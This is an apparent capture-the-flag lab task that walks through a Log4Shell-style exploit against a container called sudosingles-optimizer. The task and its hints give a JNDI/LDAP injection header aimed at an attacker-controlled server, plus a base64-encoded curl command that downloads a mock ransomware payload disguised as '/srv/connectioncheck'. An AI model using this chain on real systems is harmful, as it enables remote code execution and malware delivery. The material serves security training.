# Task 5: Drop It Like It’s Hot 🔥

## DESCRIPTION

Now that you’ve set up the malicious server, time to run the exploit.

To do this, you have to make a request to http://sudosingles-optimizer. But you’re going to include a specially crafted header to call back to your malicious LDAP server and execute a command.

In our case, the command will reach out to malicious url and drop a scary payload into the sudosingles-optimizer container.

## DETAILS

The malicious command we want to execute is:

curl PAYLOADDROPPERURL --output /srv/connectioncheck

Where PAYLOADDROPPERURL is the value found in FSSPayloadDropperUrl in the credential field below.

FSSPayloadDropperUrl is a special url that can be used to drop a ransomware payload. When the above command is executed in the container running sudosingles-optimizer, it will drop a nasty file in the /srv directory, disguised as something benign.

Just like before, we’ll make a request to our malicious LDAP server using curl on the attack machine. Open another Terminal Emulator window and run the following command:

curl http://sudosingles-optimizer -H 'X-Api-Version: ${jndi:ldap://YOURIP:1389/Basic/Command/Base64/PAYLOAD}'

Where PAYLOAD is the malicious command that we crafted above and YOURIP is the attack machine’s private IP.

However, you’ll notice that if you just try to substitute the malicious command for PAYLOAD, then run the whole request to sudosingles-optimizer above, the exploit won’t work. Something is missing...

Maybe you need to encode PAYLOAD somehow? Hm...

When you believe you’ve successfully performed the exploit, click “Verify” to check your work.

## NOTES

No actual ransomware is involved in this challenge, so don’t worry. We’re just having fun here on Tech Day.

## SCORING

Verify -> PayloadCheckerLambda

## HINTS

### HINT 1

/Basic/Command/Base64 might be a hint! And the challenge said to encode... hmm.....

### HINT 2

You need to encode the malicious command as base64, and add it to the ldap url. For example: ${jndi:ldap://YOURIP:1389/Basic/Command/Base64/BASE_64_ENCODED_COMMAND}. If that isn’t working for you, triple-check to make sure that you have encoded the malicious command correctly.

### HINT 3

    Craft the malicious command: curl PAYLOADDROPPERURL --output /srv/connectioncheck

    Encode it as base64 using any tool. Base64encode.org is a great option.

    Replace it in the command: curl http://sudosingles-optimizer -H 'X-Api-Version: ${jndi:ldap://YOURIP:1389/Basic/Command/Base64/PAYLOAD}'

    Execute
